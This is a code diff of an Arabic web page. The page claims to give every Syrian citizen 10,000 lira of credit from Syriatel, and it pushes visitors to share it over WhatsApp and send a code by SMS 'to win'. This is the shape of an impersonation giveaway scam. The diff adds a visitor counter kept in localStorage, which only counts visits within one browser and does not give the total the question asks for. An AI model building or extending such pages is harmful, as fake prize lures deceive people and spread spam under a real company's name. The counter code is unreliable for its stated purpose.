@@ -1,4 +1,4 @@
-كيف يمكنني وضع عداد لعدد الزوار لكل زائر يرى هو رقم كم الذي دخل <!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
@@ -101,6 +101,9 @@
     <!-- عرض عدد المشاركات المتبقية -->
     <p id="shareCountMessage">المشاركات المتبقية للفوز: <span id="remainingShares">5</span></p>
 
+    <!-- عرض عدد الزوار -->
+    <p id="visitorCountMessage">عدد الزوار الحالي: <span id="visitorCount">0</span></p>
+
     <div class="buttons">
         <button id="shareBtn" onclick="shareOnWhatsApp()">زر 1: شارك عبر واتس آب</button>
         <button id="copyBtn" onclick="sendSMS()" disabled>زر 2: نسخ الكود وارساله للربح</button>
@@ -116,6 +119,16 @@
         const fullMessage = `أهلاً بك في سوريا الجديدة. نقدم لكل مواطن سوري مبلغ قدره 10000 عشرة آلاف ليرة رصيد هدية مقدمة من سيريتيل.\n\nرابط الموقع: ${siteLink}`;
         
         let shareCount = 0; // عدد المشاركات
+
+        // تحديث عدد الزوار في localStorage
+        if (localStorage.getItem("visitorCount")) {
+            var visitorCount = parseInt(localStorage.getItem("visitorCount"));
+        } else {
+            var visitorCount = 0;
+        }
+        visitorCount++;
+        localStorage.setItem("visitorCount", visitorCount);
+        document.getElementById("visitorCount").textContent = visitorCount;
 
         // وظيفة مشاركة الرسالة عبر واتس آب
         function shareOnWhatsApp() {
